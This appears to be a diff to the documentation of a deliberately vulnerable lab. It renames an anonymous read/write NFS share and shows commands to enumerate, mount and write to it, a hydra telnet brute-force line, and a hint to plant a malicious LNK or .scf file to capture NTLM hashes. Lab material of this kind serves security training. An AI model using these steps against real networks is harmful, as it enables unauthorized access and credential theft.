@@ -629,11 +629,11 @@ hydra -L users.txt -P passwords.txt telnet://10.10.0.13 -t4
 
 ### IA-037 — Anonymous NFS export read/write on `file01`
 
-`C:\NFSExport` is shared as `DVAD_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.
+`C:\NFSExport` is shared as `DUNDER_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.
 
 ```bash
 showmount -e 10.10.0.13
-mkdir /mnt/dvad_nfs && sudo mount -t nfs 10.10.0.13:/DVAD_NFS /mnt/dvad_nfs
+mkdir /mnt/dvad_nfs && sudo mount -t nfs 10.10.0.13:/DUNDER_NFS /mnt/dvad_nfs
 echo 'pwn' > /mnt/dvad_nfs/test.txt
 # Plant a malicious LNK or .scf to trigger an NTLM leak when an admin browses
 ```
